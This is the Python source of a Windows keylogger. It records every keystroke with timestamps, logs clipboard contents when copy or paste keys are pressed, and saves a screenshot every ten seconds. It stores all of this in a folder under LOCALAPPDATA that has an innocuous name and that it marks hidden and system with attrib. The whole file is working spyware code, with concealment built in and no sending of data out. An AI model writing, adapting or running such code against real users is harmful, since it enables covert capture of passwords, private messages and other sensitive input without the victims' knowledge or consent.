import time
import os
# module used for capturing keys
from pynput import keyboard
# module used to get clipboard content
import pyperclip
# module used to take screenshot
from PIL import ImageGrab
import threading

# maximum file size in MB to be read
MAXFILESIZE = 10 * 1024

logPath = os.path.join(os.environ["LOCALAPPDATA"], "SystemData", "InputLogs")
# makes and hides the directory by making is hidden and system file
os.makedirs(logPath, exist_ok=True)
os.system(f'attrib +h +s "{logPath}"')
# set file name of txt file to store the logged keys
FILENAME = logPath + r"\log.txt"
# makes the directory for the screenshots
screenshotPath = os.path.join(logPath, "Screenshots")
os.makedirs(screenshotPath, exist_ok=True)

# creating a screenshot threading event to handle the thread properly
screenshotThreadEvent = threading.Event()
def take_screenshot(interval=10):
    while not screenshotThreadEvent.is_set():
        try:
            # takes the screenshot
            image = ImageGrab.grab()
            # takes the current time and name the image with that and the path
            screenshotTimeString = time.strftime("%Y-%m-%d-%H_%M_%S")
            imageName = os.path.join(screenshotPath, f"screenshot_{screenshotTimeString}.png")
            image.save(imageName)
            # makes the thread wait for the specified time
            screenshotThreadEvent.wait(interval)
        except Exception:
            pass

# a set to keep track of the keys pressed
pressedKeys = set()

def on_press(key):
    pressedKeys.add(key)
    
    lastKeyPressedTimeString = time.strftime("%Y-%m-%d %H:%M:%S")
    # append if the file exists and smaller than specified size, otherwise overwrite it.
    if (os.path.isfile(FILENAME) and os.path.getsize(FILENAME) <= MAXFILESIZE):
        flag = "a"
    else:
        flag = "w"

    with open(FILENAME, flag) as f:
        try:
            f.write(f"{key.char} pressed at {lastKeyPressedTimeString}\n")
        except AttributeError:
            # for non-ascii characters
            f.write(f"{key.name} pressed at {lastKeyPressedTimeString}\n")

    # If Alt + Caps Lock is pressed, program terminates
    if ((keyboard.Key.alt_l in pressedKeys or keyboard.Key.alt_r in pressedKeys) 
            and keyboard.Key.caps_lock in pressedKeys):
        return False
    
    # Reading the clipboard if ctrl + c / ctrl + v is pressed
    if (keyboard.Key.ctrl_l in pressedKeys or keyboard.Key.ctrl_r in pressedKeys):
        try:
            if (hasattr(key, 'char')):
                # getting the control character read by pynput
                ctrlChar = chr(ord(key.char) & 0x1F)
                # ctrl + v is pressed which pynput reads as SYN ('\x16')
                if (ctrlChar == '\x16'):
                    with open(FILENAME, flag) as f:
                        clipboard = pyperclip.paste()
                        f.write(f"{clipboard} pasted at {lastKeyPressedTimeString}\n")
                # ctrl + c is pressed which pynput reads as ETX ('\x03')
                elif (ctrlChar == '\x03'):
                    with open(FILENAME, flag) as f:
                        clipboard = pyperclip.paste()
                        f.write(f"{clipboard} copied at {lastKeyPressedTimeString}\n")
        except OSError:
            pass

def on_release(key):
    pressedKeys.discard(key)
    
# creates the thread for screenshots whilst still listening to keyboard
screenshotThread = threading.Thread(target=take_screenshot, args=(10,))
screenshotThread.start()

try:    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    pass
finally:
    # ends the thread
    screenshotThreadEvent.set()
    screenshotThread.join()